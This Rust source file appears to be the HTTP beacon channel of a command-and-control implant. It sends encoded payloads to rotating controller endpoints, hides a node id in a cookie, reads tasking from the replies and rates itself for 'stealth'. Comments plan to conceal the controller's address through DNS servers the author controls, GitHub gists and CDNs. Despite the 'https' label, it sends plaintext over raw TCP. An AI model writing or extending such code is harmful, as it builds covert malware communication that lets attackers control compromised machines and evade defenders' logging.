use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;

use super::{Channel, ChannelInfo, Latency, SendContext};

pub struct HTTPChannel {
    endpoints: Vec<String>,
    current: std::sync::atomic::AtomicUsize,
    info: ChannelInfo,
}

impl HTTPChannel {
    pub fn new(endpoints: Vec<String>) -> Result<Self, Box<dyn std::error::Error>> {
        Ok(HTTPChannel {
            endpoints,
            current: std::sync::atomic::AtomicUsize::new(0),
            info: ChannelInfo {
                name: "https",
                max_payload: 1 << 20,
                bidirectional: true,
                confirmed: true,
                stealth: 1,
                latency: Latency::Realtime,
            },
        })
    }

    fn next_endpoint(&self) -> &str {
        let idx = self.current.load(std::sync::atomic::Ordering::Relaxed);
        &self.endpoints[idx % self.endpoints.len()]
    }

    fn advance_endpoint(&self) {
        self.current.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    }

    fn parse_host_port(endpoint: &str) -> (&str, &str, u16) {
        // Strip scheme
        let without_scheme = endpoint
            .strip_prefix("https://")
            .or_else(|| endpoint.strip_prefix("http://"))
            .unwrap_or(endpoint);

        // Split host and port
        let (host, port) = if let Some(pos) = without_scheme.rfind(':') {
            let p = without_scheme[pos + 1..]
                .trim_end_matches('/')
                .parse::<u16>()
                .unwrap_or(80);
            (&without_scheme[..pos], p)
        } else {
            let host = without_scheme.trim_end_matches('/');
            if endpoint.starts_with("https://") {
                (host, 443u16)
            } else {
                (host, 80u16)
            }
        };

        // will have to put a lot of thought into the dns portion here
        // lot of options, doh to a popular dns like 1.1.1.1
        // piggyback on existing resolvers
        // query a dns server we control for a popular domain but return our own ips
        // encode the ip into a legitimate looking github gist or repo
        // host behind a popular cdn or a pointer file behind a popular cdn
        // lot of trade-offs and ease of logging at each step
        // will think of other creative solutions for this soon

        (host, without_scheme.trim_end_matches('/'), port)
    }
}

impl Channel for HTTPChannel {
    fn info(&self) -> &ChannelInfo {
        &self.info
    }

    fn send(&self, ctx: &SendContext) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
        let endpoint = self.next_endpoint();
        let (host, _host_port, port) = Self::parse_host_port(endpoint);

        let key_id_hex = hex::encode(ctx.key_id);
        let payload_b64 = BASE64.encode(&ctx.payload);
        let body = format!("{}{}", key_id_hex, payload_b64);

        let addr = format!("{}:{}", host, port);
        let mut stream = match TcpStream::connect_timeout(
            &addr.parse()?,
            Duration::from_secs(30),
        ) {
            Ok(s) => s,
            Err(e) => {
                self.advance_endpoint();
                return Err(e.into());
            }
        };
        stream.set_read_timeout(Some(Duration::from_secs(30)))?;

        let request = format!(
            "POST / HTTP/1.1\r\n\
             Host: {}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: {}\r\n\
             Cookie: sid={}\r\n\
             Connection: close\r\n\
             \r\n\
             {}",
            host,
            body.len(),
            ctx.node_id,
            body,
        );

        stream.write_all(request.as_bytes())?;

        // Read response
        let mut response = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            match stream.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => response.extend_from_slice(&buf[..n]),
                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => break,
                Err(e) if e.kind() == std::io::ErrorKind::TimedOut => break,
                Err(e) => return Err(e.into()),
            }
        }

        // Extract body from response
        let response_str = String::from_utf8_lossy(&response);
        if let Some(pos) = response_str.find("\r\n\r\n") {
            let body = &response[pos + 4..];
            if body.is_empty() {
                Ok(None)
            } else {
                Ok(Some(body.to_vec()))
            }
        } else {
            Ok(None)
        }
    }
}